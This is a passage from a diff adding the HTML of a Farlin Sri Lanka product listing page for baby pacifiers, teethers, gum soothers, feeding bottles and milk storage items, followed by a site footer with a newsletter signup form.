+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  one-pieceteetherpacifier">
+                        	<a href="http://farlin.lk/products/one-piece-teether-pacifier-2/"><span><strong>One-Piece Teether Pacifier</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/TOP-106_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  pacifierclip">
+                        	<a href="http://farlin.lk/products/pacifier-clip-2/"><span><strong>Pacifier Clip</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-135A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  one-piecepacifier">
+                        	<a href="http://farlin.lk/products/one-piece-pacifier/"><span><strong>One-Piece Pacifier</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/TOP-100_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  auto-closesiliconepacifier">
+                        	<a href="http://farlin.lk/products/auto-close-silicone-pacifier-bf-006s/"><span><strong>Auto-Close Silicone Pacifier</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-006S_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  siliconegumsoother">
+                        	<a href="http://farlin.lk/products/silicone-gum-soother-bf-14104/"><span><strong>Silicone Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-14104_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  rubbergumsoother">
+                        	<a href="http://farlin.lk/products/rubber-gum-soother-3/"><span><strong>Rubber Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-14001_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  oolinggumsoother">
+                        	<a href="http://farlin.lk/products/ooling-gum-soother-2/"><span><strong>ooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-144_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  oolinggumsoother">
+                        	<a href="http://farlin.lk/products/ooling-gum-soother/"><span><strong>ooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-143_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  coolinggumsoother">
+                        	<a href="http://farlin.lk/products/cooling-gum-soother-4/"><span><strong>Cooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-142_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  rubbergumsoother">
+                        	<a href="http://farlin.lk/products/rubber-gum-soother-2/"><span><strong>Rubber Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-141_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  rubbergumsoother">
+                        	<a href="http://farlin.lk/products/rubber-gum-soother/"><span><strong>Rubber Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-140_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  apandscrewforstandardfeedingbottle">
+                        	<a href="http://farlin.lk/products/ap-and-screw-for-standard-feeding-bottle-cap-3/"><span><strong>ap and Screw for Standard Feeding Bottle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/CAP-3_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  capandscrewforstandardfeedingbottle">
+                        	<a href="http://farlin.lk/products/cap-and-screw-for-standard-feeding-bottle-cap-1/"><span><strong>Cap and Screw for Standard Feeding Bottle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/CAP-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  wideneckglassfeedingbottle">
+                        	<a href="http://farlin.lk/products/wide-neck-glass-feeding-bottle-bf-810g/"><span><strong>Wide Neck Glass Feeding Bottle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-810G_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  both-handbottle-handle">
+                        	<a href="http://farlin.lk/products/both-hand-bottle-handle-nf-888-2/"><span><strong>Both-Hand Bottle-Handle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/NF-888-2_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  unbreakableinsulatedbottle">
+                        	<a href="http://farlin.lk/products/unbreakable-insulated-bottle-bf-220/"><span><strong>Unbreakable Insulated Bottle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-220_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  nipple-holepuncher">
+                        	<a href="http://farlin.lk/products/nipple-hole-puncher-bf-112/"><span><strong>Nipple-Hole Puncher</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-112_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  stretchypacifierset&#8211;6m+">
+                        	<a href="http://farlin.lk/products/stretchy-pacifier-set-6m-top-112-2/"><span><strong>Stretchy Pacifier Set &#8211; 6M+</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-112-2_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  stretchypacifier&#8211;6m+">
+                        	<a href="http://farlin.lk/products/stretchy-pacifier-6m/"><span><strong>Stretchy Pacifier &#8211; 6M+</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-112_2_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  stretchypacifier&#8211;0m+">
+                        	<a href="http://farlin.lk/products/stretchy-pacifier-0m/"><span><strong>Stretchy Pacifier &#8211; 0M+</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-111_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  glow-in-darkpacifierholderset&#8211;6m+">
+                        	<a href="http://farlin.lk/products/glow-in-dark-pacifier-holder-set-6m-top-101-2/"><span><strong>Glow-in-Dark Pacifier Holder Set &#8211; 6M+</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-101-2_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  glow-in-darkpacifier&#8211;6m+">
+                        	<a href="http://farlin.lk/products/glow-in-dark-pacifier-6m/"><span><strong>Glow-in-Dark Pacifier &#8211; 6M+</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-101_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  glow-in-darkpacifier&#8211;6to18m">
+                        	<a href="http://farlin.lk/products/glow-in-dark-pacifier-6-to-18m/"><span><strong>Glow-in-Dark Pacifier &#8211; 6 to 18M</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-102_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 138  stretchyanti-colicfur-preventingnipple&#8211;forwide-neck&#8211;2pcpack">
+                        	<a href="http://farlin.lk/products/stretchy-anti-colic-fur-preventing-nipple-for-wide-neck-2pc-pack/"><span><strong>Stretchy Anti-Colic Fur-Preventing Nipple &#8211; For Wide-neck &#8211; 2pc pack</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/P-3_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 138  stretchyanti-colicfur-preventingnipple&#8211;forstandard-neck&#8211;2pcpack">
+                        	<a href="http://farlin.lk/products/stretchy-anti-colic-fur-preventing-nipple-for-standard-neck-2pc-pack/"><span><strong>Stretchy Anti-Colic Fur-Preventing Nipple &#8211; For Standard-neck &#8211; 2pc pack</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/T-3_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  siliconegumsoother">
+                        	<a href="http://farlin.lk/products/silicone-gum-soother/"><span><strong>Silicone Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-14107_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  coolinggumsoother">
+                        	<a href="http://farlin.lk/products/cooling-gum-soother-3/"><span><strong>Cooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-14501_b_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  coolinggumsoother">
+                        	<a href="http://farlin.lk/products/cooling-gum-soother-bf-148/"><span><strong>Cooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-148_b_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  ppfeedingbottle&#8211;standardneck240cc">
+                        	<a href="http://farlin.lk/products/pp-feeding-bottle-standard-neck-240cc/"><span><strong>PP Feeding Bottle &#8211; Standard Neck 240cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/PP-767_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  pesfeedingbottle&#8211;wideneck270cc">
+                        	<a href="http://farlin.lk/products/pes-feeding-bottle-wide-neck-270cc/"><span><strong>PES Feeding Bottle &#8211; Wide Neck 270cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/PES-888_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  pesfeedingbottle&#8211;wideneck140cc">
+                        	<a href="http://farlin.lk/products/pes-feeding-bottle-wide-neck-140cc/"><span><strong>PES Feeding Bottle &#8211; Wide Neck 140cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/PES-880_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  newtouchsiliconefeedingbottle240cc">
+                        	<a href="http://farlin.lk/products/new-touch-silicone-feeding-bottle-240cc-nf-902/"><span><strong>New Touch Silicone Feeding Bottle 240cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/NF-902_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  newtouchsiliconefeedingbottle240cc">
+                        	<a href="http://farlin.lk/products/new-touch-silicone-feeding-bottle-240cc/"><span><strong>New Touch Silicone Feeding Bottle 240cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/NF-901_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  heatresistantglassfeeder&#8211;standardneck240cc">
+                        	<a href="http://farlin.lk/products/heat-resistant-glass-feeder-standard-neck-240cc/"><span><strong>Heat Resistant Glass Feeder &#8211; Standard Neck 240cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-707G_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  heatresistantglassfeeder&#8211;standardneck120cc">
+                        	<a href="http://farlin.lk/products/heat-resistant-glass-feeder-standard-neck-120cc/"><span><strong>Heat Resistant Glass Feeder &#8211; Standard Neck 120cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/TOP-808G_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  glassfeedingbottle&#8211;standardneck240cc">
+                        	<a href="http://farlin.lk/products/glass-feeding-bottle-standard-neck-240cc-bf-707g/"><span><strong>Glass Feeding Bottle &#8211; Standard Neck 240cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-707G_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  softstrawset">
+                        	<a href="http://farlin.lk/products/soft-straw-set/"><span><strong>Soft Straw Set</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/NF-303-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  milkstoragebottleset+5storagebottles">
+                        	<a href="http://farlin.lk/products/milk-storage-bottle-set-5-storage-bottles/"><span><strong>Milk Storage Bottle Set + 5 Storage Bottles</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BP-868-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  milkstoragebottle3pcbox">
+                        	<a href="http://farlin.lk/products/milk-storage-bottle-3pc-box/"><span><strong>Milk Storage Bottle 3pc box</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BP-868_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  milkstoragebag(200cc)20+2pack">
+                        	<a href="http://farlin.lk/products/milk-storage-bag-200cc-202-pack/"><span><strong>Milk Storage Bag (200cc) 20+2 pack</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BP-869-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  fruitseriespacifier(6m+)">
+                        	<a href="http://farlin.lk/products/fruit-series-pacifier-6m/"><span><strong>Fruit Series Pacifier (6M+)</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-007_2_product_main1.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  fruitseriespacifier(0m+)">
+                        	<a href="http://farlin.lk/products/fruit-series-pacifier-0m/"><span><strong>Fruit Series Pacifier (0M+)</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-007_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 138  anti-colicsiliconenipple&#8211;forwide-neck&#8211;2pcpack">
+                        	<a href="http://farlin.lk/products/anti-colic-silicone-nipple-for-wide-neck-2pc-pack/"><span><strong>Anti-Colic Silicone Nipple &#8211; For Wide-neck &#8211; 2pc pack</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/P-5_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 138  anti-colicsiliconenipple&#8211;forstandard-neck&#8211;2pcpack">
+                        	<a href="http://farlin.lk/products/anti-colic-silicone-nipple-for-standard-neck-2pc-pack/"><span><strong>Anti-Colic Silicone Nipple &#8211; For Standard-neck &#8211; 2pc pack</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/H-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  coolinggumsoother">
+                        	<a href="http://farlin.lk/products/cooling-gum-soother-2/"><span><strong>Cooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/2.jpg"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 137  coolinggumsoother">
+                        	<a href="http://farlin.lk/products/cooling-gum-soother/"><span><strong>Cooling Gum Soother</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-145_b_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  glassfeedingbottle&#8211;standardneck120cc">
+                        	<a href="http://farlin.lk/products/glass-feeding-bottle-standard-neck-120cc/"><span><strong>Glass Feeding Bottle &#8211; Standard Neck 120cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-808G_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  glassfeedingbottle&#8211;standardneck60cc">
+                        	<a href="http://farlin.lk/products/glass-feeding-bottle-standard-neck-60cc/"><span><strong>Glass Feeding Bottle &#8211; Standard Neck 60cc</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/NB-205G_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 135  milkstoragebag&#8211;120cc&#8211;20+2pack">
+                        	<a href="http://farlin.lk/products/milk-storage-bag-120cc-202-pack/"><span><strong>Milk Storage Bag &#8211; 120cc &#8211; 20+2 pack</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BP-869-2_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                       
+                    </ul>
+                  
+                  
+                   </div> 
+                   <script type="text/javascript">
+        $(function() {
+           /* $("#demo5").paginate({
+                count         : 53,
+                start         : 1,
+                display     : 7,
+                border                    : true,
+                border_color            : '#fff',
+                text_color              : '#fff',
+                background_color        : 'black',    
+                border_hover_color        : '#ccc',
+                text_hover_color          : '#000',
+                background_hover_color    : '#fff', 
+                images                    : false,
+                mouse                    : 'press',
+                onChange                 : function(page){
+                                            $('._current','#paginationdemo').removeClass('_current').hide();
+                                            $('#p'+page).addClass('_current').show();
+                                          }
+            }); */
+        });
+        </script>                
+                         
+                <div id="demo5"></div>  
+                  
+                </section>
+            </section>
+        </div><!--hero-->
+    </div><!--wrapper-->
+     </div>
+	
+<footer class="footer">
+	<div class="footer-mid">
+    	<div class="top-img"></div>
+        <div class="links">
+        	<div class="middle-cvr-pre-footer">
+    	<div class="ul-cvr">
+        <h2>Farlin Sri Lanka</h2>
+        	<ul>
+                <a href="http://farlin.lk/index.php"><li>Home</li></a>
+                <a href="http://farlin.lk//about"><li>About</li></a>
+                <a href="http://farlin.lk/customer-care"><li></li></a>
+                <a href="http://farlin.lk/where-to-buy"><li>Where to Buy</li></a>
+                <a href="http://farlin.lk/mothers-room"><li>Mother's Club</li></a>
+            </ul>
+        </div>
+        <div class="ul-cvr">
+        <h2>Products</h2>
+        	<ul>             
+                <a href="http://farlin.lk/products/age_range/feeding/"><li>Feeding</li></a>
+                <a href="http://farlin.lk/products/age_range/for-mom/"><li>For Mom</li></a>
+                <a href="http://farlin.lk/productcategories/furniture-bedding/"><li>Furniture & Bedding</li></a>
+                <a href="http://farlin.lk/productcategories/gifts/"><li>Gifts</li></a>
+                <a href="http://farlin.lk/products/age_range/grooming-hygiene/"><li>Grooming & Hygiene</li></a>            	
+            </ul>
+        </div>
+         <div class="ul-cvr">
+        <h2>Products</h2>
+        	<ul>
+            	 <a href="http://farlin.lk/productcategories/health-safety/"><li>Health & Safety</li></a>
+                <a href="http://farlin.lk/productcategories/outgoing"><li>Outgoing</li></a>
+                <a href="http://farlin.lk/productcategories/plaything-footwear/"><li>Plaything & Footwear</li></a>
+                <a href="http://farlin.lk/productcategories/weaning"><li>Weaning</li></a>
+                <a href="http://farlin.lk/"><li></li></a>
+            </ul>
+        </div>
+        <div class="ul-cvr">
+        <h2>Newsletter sign up</h2>
+        	<ul class="special">            	
+               <li><div class="signup-footer">
+                    <form id="footer_subcri" name="footer_subcri">                    
+                    <input type="hidden" class="signup"   name="nn" id="nn" /> 
+                    <input style="margin-bottom:0px;" class="news-letter" onblur="if (this.value=='') this.value=this.defaultValue" onclick="if (this.defaultValue==this.value) this.value=''" value="Your email" name="ne"> 
+                    <input type="hidden" class="signup"   name="np1" id="np1" />                     
+                    <input type="hidden" class="signup"  name="np2" id="np2"/>
+                    <input type="hidden" class="signup"   name="np3" id="np3" />                     
+                    <input type="hidden" class="signup"   name="np4" id="np4"/>                     
+                    <input type="hidden" class="signup"   name="np5" id="np5" /> 
+                    <input type="hidden" name="na" value="s"> 
+                    <input type="hidden" name="nr" value="plugin">
+                    <input type="submit" class="btn-legoclub"  value="Sign Up">
+                    </form>
+                </div></li> 
+            </ul>
+        </div>
+         <script type="text/javascript">  
+                    var frmvalidator  = new Validator("footer_subcri"); 
+                    frmvalidator.addValidation("ne","req","please enter email");  
+                    frmvalidator.addValidation("ne","email","please enter valid email");
+              </script>      
+        <div class="ul-cvr">
+        <h2>Follow Us</h2>
+        	<ul class="fb">
+            	<li><a href="https://www.facebook.com/Farlin.lk"><img src="http://farlin.lk/wp-content/themes/KTI-lego/img/images/FACEBOOK_70.png" /></a></li>
+                <li><a href="https://twitter.com/Farlin_LK"><img src="http://farlin.lk/wp-content/themes/KTI-lego/img/images/FACEBOOK_72.png" /></a></li>  
+
+               <!-- <div style="margin-left: 21px; float: right; margin-top: -3px;"><a href="http://www.bestweb.lk/vote/voteme.php?domain=www.lego.lk"><img width="78px" src="http://www.kti.lk/my-content/themes/rounder/design/img/voteme.png" alt="Vote For Us"></a></div> -->
+
+            </ul>
+        </div>
+		
+		<style type="text/css">
+
+                .links {
+                    position: relative;
+                }
+
+            </style>
+
+           <div class="final">
+           	<div class="cpy">&copy; 2004 - 2013 Farlin by  <a href="http://www.kti.lk" target="_blank">Kti Srilanka</a></div>
+            <div class="pyxle">Design &amp; concept by <a href="http://www.pyxle.net" target="_blank">pyxle</a></div>
+           </div>
+           </div>
+    </div>
+        </div>
+    </div>
+ 
+</footer>
+<script type="text/javascript">
+	$(document).ready(function(){
+
+		$('#scrollbar1').tinyscrollbar();
+
+	});
+</script>
+</body>
+</html>
